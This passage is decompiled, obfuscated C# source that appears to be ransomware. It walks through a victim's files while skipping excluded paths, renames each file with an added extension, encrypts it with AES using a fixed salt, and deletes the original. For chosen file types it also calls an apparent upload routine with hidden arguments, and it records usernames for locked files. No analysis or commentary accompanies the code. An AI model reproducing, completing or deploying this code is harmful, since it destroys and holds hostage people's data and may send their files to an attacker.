									if (iQHvEzXEixXur.yPLRgFIAPWTIT(hggTPAfoWyJLMW: (!oVxIyLzScyQqp) ? (YrjqOIvQHnLHl ? iQHvEzXEixXur.fYNdrMmszbFBKK(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : iQHvEzXEixXur.fYNdrMmszbFBKK(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (YrjqOIvQHnLHl ? qHHSaqSanlGZcJ.vHaUZnXLDnsvO(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk)) : qHHSaqSanlGZcJ.vHaUZnXLDnsvO(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk))), rGiQcJBSsDU: CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa, LoTahZDxSK: bytes2))
									{
										goto IL_0ea4;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!YrjqOIvQHnLHl)
								{
									if (IQGXzrSFQTv.lVXyHETerTvlQUP(CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa, KHcVbQthlIOKM, CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL, null, Convert.FromBase64String(MxPnNSnkNuk)))
									{
										goto IL_0ea4;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (IQGXzrSFQTv.lVXyHETerTvlQUP(CS_0024_003C_003E8__locals0.zmYEiyqFDPcwDa, KHcVbQthlIOKM, CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL, bytes2, Convert.FromBase64String(MxPnNSnkNuk)))
									{
										goto IL_0ea4;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_0759:;
							}
							catch (Exception)
							{
								goto IL_0ea4;
							}
						}
					}
					continue;
					IL_0ea4:
					CS_0024_003C_003E8__locals0.ZIfnfpwnJXQh.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.ZIfnfpwnJXQh, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new TVOFMeqqDEgV.FXSsqhzMboXGq();
			CS_0024_003C_003E8__locals0.LrHzfRIVwfYz = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.IZTAVYfIRdMx = string_0;
			if (((!CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107388107)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107388050)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107388529)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388544)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388499)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107388474)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107388485)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388440)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388459)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388422)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388381)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388396)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388338)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107388317))) || CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(EvKBdYIakj(TVOFMeqqDEgV.getString_0(107388324)))) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107387739)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107387754)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107387705)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107387720)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107387671)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107387686)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107387637)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107387652)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107387607)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107387618)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107387573)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107387592)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107387543)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().Contains(TVOFMeqqDEgV.getString_0(107387558)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(EvKBdYIakj(TVOFMeqqDEgV.getString_0(107388021))) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107387996)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107388015)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107397159)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107388002)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(CS_0024_003C_003E8__locals0.DAzuLkugKGvA) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(TVOFMeqqDEgV.getString_0(107387977)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(TVOFMeqqDEgV.getString_0(107387972)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(TVOFMeqqDEgV.getString_0(107387935)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(TVOFMeqqDEgV.getString_0(107387930)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(TVOFMeqqDEgV.getString_0(107387925)) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(dkWBHAPryK) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(AJzDKHoaGNRf) && !CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.Contains(THXwmzLnrqe))
			{
				if (CS_0024_003C_003E8__locals0.TtcBirpqXuVooOHN.Length != 0)
				{
					string[] ttcBirpqXuVooOHN = CS_0024_003C_003E8__locals0.TtcBirpqXuVooOHN;
					int num = 0;
					while (num < ttcBirpqXuVooOHN.Length)
					{
						string value = ttcBirpqXuVooOHN[num];
						if (!CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_102b;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.EndsWith(CS_0024_003C_003E8__locals0.DAzuLkugKGvA))
					{
						goto IL_102b;
					}
				}
				catch (Exception)
				{
					goto IL_102b;
				}
				if (!mOohEoBvvwIsCph.Contains(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx))
				{
					if (tFYBgTlzqriJCl == TVOFMeqqDEgV.getString_0(107396988))
					{
						try
						{
							if (MXkjmbkMlDW.nnnWjuJHpHvdMj(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx))
							{
								MXkjmbkMlDW.APIOoSxtqbbrVSl(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
							}
						}
						catch
						{
						}
					}
					mOohEoBvvwIsCph.Add(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
					if (!AVcTEbDnEiIrK.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx)))
					{
						AVcTEbDnEiIrK.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx));
					}
					DFfJXunWWjOBFo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
					try
					{
						new ZEeNAmcCpQxkDS().EKaaTjlENBUCQI(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (DHKhstFrxWX)
								{
									Console.WriteLine(TVOFMeqqDEgV.getString_0(107411743) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + TVOFMeqqDEgV.getString_0(107411698) + new FileInfo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx).Length + TVOFMeqqDEgV.getString_0(107411677));
									Console.WriteLine(TVOFMeqqDEgV.getString_0(107411668));
								}
							}
							catch
							{
							}
							QKkRdHWXNelGs(EvKBdYIakj(TVOFMeqqDEgV.getString_0(107412107)), TVOFMeqqDEgV.getString_0(107388677) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + TVOFMeqqDEgV.getString_0(107388677) + EvKBdYIakj(TVOFMeqqDEgV.getString_0(107412050)) + TVOFMeqqDEgV.getString_0(107388677) + Environment.UserName + TVOFMeqqDEgV.getString_0(107388677) + EvKBdYIakj(TVOFMeqqDEgV.getString_0(107412065)));
						}
					}
					catch (Exception ex2)
					{
						if (IxPlnZLdvsZB)
						{
							try
							{
								File.AppendAllText(AJzDKHoaGNRf, TVOFMeqqDEgV.getString_0(107386466) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + TVOFMeqqDEgV.getString_0(107412040) + ex2.Message + TVOFMeqqDEgV.getString_0(107396508));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx).Length != 0L)
							{
								goto end_IL_0875;
							}
							goto end_IL_0874;
							end_IL_0875:;
						}
						catch (Exception ex2)
						{
							if (IxPlnZLdvsZB)
							{
								try
								{
									File.AppendAllText(AJzDKHoaGNRf, TVOFMeqqDEgV.getString_0(107386466) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + TVOFMeqqDEgV.getString_0(107411927) + ex2.Message + TVOFMeqqDEgV.getString_0(107396508));
								}
								catch (Exception)
								{
								}
							}
							YQVkVIVGpFAMQ++;
							goto end_IL_0874;
						}
						if (QhxiUhpytB == TVOFMeqqDEgV.getString_0(107396988) && new FileInfo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx).Length > Convert.ToInt32(KHcVbQthlIOKM) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.DAzuLkugKGvA != TVOFMeqqDEgV.getString_0(107385707))
								{
									if (ftECRArlHKepq)
									{
										CS_0024_003C_003E8__locals0.DAzuLkugKGvA = ITyFXeyNngsRQ + CS_0024_003C_003E8__locals0.DAzuLkugKGvA;
									}
									File.Move(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + CS_0024_003C_003E8__locals0.DAzuLkugKGvA);
								}
							}
							catch (Exception ex2)
							{
								if (IxPlnZLdvsZB)
								{
									try
									{
										File.AppendAllText(AJzDKHoaGNRf, TVOFMeqqDEgV.getString_0(107386466) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + TVOFMeqqDEgV.getString_0(107411866) + ex2.Message + TVOFMeqqDEgV.getString_0(107396508));
									}
									catch (Exception)
									{
									}
								}
								YQVkVIVGpFAMQ++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.DAzuLkugKGvA != TVOFMeqqDEgV.getString_0(107385707))
							{
								CS_0024_003C_003E8__locals0.IZTAVYfIRdMx += CS_0024_003C_003E8__locals0.DAzuLkugKGvA;
							}
							if (oaMCRFYrdbFfau == TVOFMeqqDEgV.getString_0(107396988))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in WOAZqErHQpvAHsj)
									{
										if (CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.LrHzfRIVwfYz.DAzuLkugKGvA) && XvBfbWHuciprZZ == TVOFMeqqDEgV.FXSsqhzMboXGq.getString_0(107396994))
										{
											if (Convert.ToInt32(cfZDnOvovZah) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx).Length)
											{
												try
												{
													hdkhpYUKtylncPr.xRNINHsHor(TVOFMeqqDEgV.FXSsqhzMboXGq.getString_0(107389877), TVOFMeqqDEgV.FXSsqhzMboXGq.getString_0(107389872), TVOFMeqqDEgV.FXSsqhzMboXGq.getString_0(107389315), CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.IZTAVYfIRdMx.ToLower().EndsWith(item3) && XvBfbWHuciprZZ == TVOFMeqqDEgV.FXSsqhzMboXGq.getString_0(107396492))
										{
											try
											{
												hdkhpYUKtylncPr.xRNINHsHor(TVOFMeqqDEgV.FXSsqhzMboXGq.getString_0(107389877), TVOFMeqqDEgV.FXSsqhzMboXGq.getString_0(107389872), TVOFMeqqDEgV.FXSsqhzMboXGq.getString_0(107389315), CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(CcZHpsCIoJG);
							if (LhIskusGNtqPC == TVOFMeqqDEgV.getString_0(107396486))
							{
								byte[] array = null;
								byte[] byte_ = iQHvEzXEixXur.zQnYkaPtyUjj(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, Convert.ToInt32(KHcVbQthlIOKM) * 1024 * 1024);
								if (!iQHvEzXEixXur.yPLRgFIAPWTIT(hggTPAfoWyJLMW: (!oVxIyLzScyQqp) ? (YrjqOIvQHnLHl ? iQHvEzXEixXur.fYNdrMmszbFBKK(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : iQHvEzXEixXur.fYNdrMmszbFBKK(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (YrjqOIvQHnLHl ? qHHSaqSanlGZcJ.vHaUZnXLDnsvO(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk)) : qHHSaqSanlGZcJ.vHaUZnXLDnsvO(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk))), rGiQcJBSsDU: CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, LoTahZDxSK: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!YrjqOIvQHnLHl)
							{
								if (!IQGXzrSFQTv.lVXyHETerTvlQUP(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, KHcVbQthlIOKM, CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL, null, Convert.FromBase64String(MxPnNSnkNuk)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!IQGXzrSFQTv.lVXyHETerTvlQUP(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, KHcVbQthlIOKM, CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL, bytes, Convert.FromBase64String(MxPnNSnkNuk)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (ftECRArlHKepq)
							{
								CS_0024_003C_003E8__locals0.DAzuLkugKGvA = ITyFXeyNngsRQ + CS_0024_003C_003E8__locals0.DAzuLkugKGvA;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(CcZHpsCIoJG);
							if (CS_0024_003C_003E8__locals0.DAzuLkugKGvA != TVOFMeqqDEgV.getString_0(107385707))
							{
								if (!aYdUAapWGSeW)
								{
									if (!YrjqOIvQHnLHl)
									{
										VzUXnxrRrdNjo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, NLiEmQZDarX);
									}
									else
									{
										VzUXnxrRrdNjo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL));
									}
								}
								else
								{
									try
									{
										if (!YrjqOIvQHnLHl)
										{
											KaQFQiQUZOvLzjc(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, NLiEmQZDarX, Convert.FromBase64String(MxPnNSnkNuk));
										}
										else
										{
											KaQFQiQUZOvLzjc(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk));
										}
									}
									catch (Exception ex2)
									{
										if (IxPlnZLdvsZB)
										{
											try
											{
												File.AppendAllText(AJzDKHoaGNRf, TVOFMeqqDEgV.getString_0(107386466) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + TVOFMeqqDEgV.getString_0(107385661) + ex2.Message + TVOFMeqqDEgV.getString_0(107396508));
											}
											catch (Exception)
											{
											}
										}
										YQVkVIVGpFAMQ++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!aYdUAapWGSeW)
							{
								if (!YrjqOIvQHnLHl)
								{
									VzUXnxrRrdNjo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + TVOFMeqqDEgV.getString_0(107385702), NLiEmQZDarX);
								}
								else
								{
									VzUXnxrRrdNjo(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + TVOFMeqqDEgV.getString_0(107385702), Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL));
								}
							}
							else
							{
								try
								{
									if (!YrjqOIvQHnLHl)
									{
										KaQFQiQUZOvLzjc(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, NLiEmQZDarX, Convert.FromBase64String(MxPnNSnkNuk));
									}
									else
									{
										KaQFQiQUZOvLzjc(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptbrIyAxDBqTL), Convert.FromBase64String(MxPnNSnkNuk));
									}
								}
								catch (Exception ex2)
								{
									if (IxPlnZLdvsZB)
									{
										try
										{
											File.AppendAllText(AJzDKHoaGNRf, TVOFMeqqDEgV.getString_0(107386466) + CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + TVOFMeqqDEgV.getString_0(107385661) + ex2.Message + TVOFMeqqDEgV.getString_0(107396508));
										}
										catch (Exception)
										{
										}
									}
									YQVkVIVGpFAMQ++;
									return;
								}
							}
							if (YrjqOIvQHnLHl)
							{
								if (CS_0024_003C_003E8__locals0.DAzuLkugKGvA != TVOFMeqqDEgV.getString_0(107385707))
								{
									cPkfysCcaOIXirBU(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx + CS_0024_003C_003E8__locals0.DAzuLkugKGvA, bytes);
								}
								else
								{
									cPkfysCcaOIXirBU(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx, bytes);
								}
							}
						}
						end_IL_0874:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_102b;
			IL_102b:
			CS_0024_003C_003E8__locals0.ZIfnfpwnJXQh.Remove(CS_0024_003C_003E8__locals0.IZTAVYfIRdMx);
		});
	}

	private static void PncDZZHetVEA(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (oaMCRFYrdbFfau == getString_0(107396968))
					{
						foreach (string item in WOAZqErHQpvAHsj)
						{
							if (string_0.ToLower().EndsWith(item) && XvBfbWHuciprZZ == getString_0(107396968))
							{
								if (Convert.ToInt32(cfZDnOvovZah) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										hdkhpYUKtylncPr.xRNINHsHor(getString_0(107389851), getString_0(107389846), getString_0(107389289), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && XvBfbWHuciprZZ == getString_0(107396466))
							{
								try
								{
									hdkhpYUKtylncPr.xRNINHsHor(getString_0(107389851), getString_0(107389846), getString_0(107389289), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107385682)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107385682), getString_0(107389226)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void KaQFQiQUZOvLzjc(string TgRhRIvxIjkx, string fvTTAQlZmdlFJc, byte[] wLwGJSiuWmWv, byte[] QwyxRQeDSiSPy = null)
	{
		try
		{
			if (oaMCRFYrdbFfau == getString_0(107396968))
			{
				FileStream fileStream = new FileStream(TgRhRIvxIjkx, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in WOAZqErHQpvAHsj)
				{
					if (TgRhRIvxIjkx.ToLower().EndsWith(item) && XvBfbWHuciprZZ == getString_0(107396968))
					{
						if (Convert.ToInt32(cfZDnOvovZah) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								hdkhpYUKtylncPr.xRNINHsHor(getString_0(107389851), getString_0(107389846), getString_0(107389289), TgRhRIvxIjkx);
							}
							catch
							{
							}
						}
					}
					else if (TgRhRIvxIjkx.ToLower().EndsWith(item) && XvBfbWHuciprZZ == getString_0(107396466))
					{
						try
						{
							hdkhpYUKtylncPr.xRNINHsHor(getString_0(107389851), getString_0(107389846), getString_0(107389289), TgRhRIvxIjkx);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (TgRhRIvxIjkx != fvTTAQlZmdlFJc)
		{
			File.Move(TgRhRIvxIjkx, fvTTAQlZmdlFJc);
			TgRhRIvxIjkx = fvTTAQlZmdlFJc;
		}
		byte[] bytes = qHHSaqSanlGZcJ.vHaUZnXLDnsvO(File.ReadAllBytes(TgRhRIvxIjkx), wLwGJSiuWmWv, QwyxRQeDSiSPy);
		File.WriteAllBytes(TgRhRIvxIjkx, bytes);
		emFRwwndTZvr++;
	}

	private static void VzUXnxrRrdNjo(string string_0, string string_1, byte[] byte_0)
	{
		kLpGSGMZUAukasnx CS_0024_003C_003E8__locals0 = new kLpGSGMZUAukasnx();
		CS_0024_003C_003E8__locals0.eAApvYWrRc = string_0;
		CS_0024_003C_003E8__locals0.ozpNWwBFrGtY = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string ozpNWwBFrGtY = CS_0024_003C_003E8__locals0.ozpNWwBFrGtY;
			FileStream fileStream = new FileStream(ozpNWwBFrGtY, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (NrRjEEeptLvAPsW == getString_0(107396968))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.eAApvYWrRc, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.eAApvYWrRc, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.eAApvYWrRc, FileMode.Open);
				int num2;
				while ((num2 = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num2);
				}
				fileStream2.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.ozpNWwBFrGtY.Length > 0)
				{
					if (oaMCRFYrdbFfau == getString_0(107396968))
					{
						FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.eAApvYWrRc, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in WOAZqErHQpvAHsj)
						{
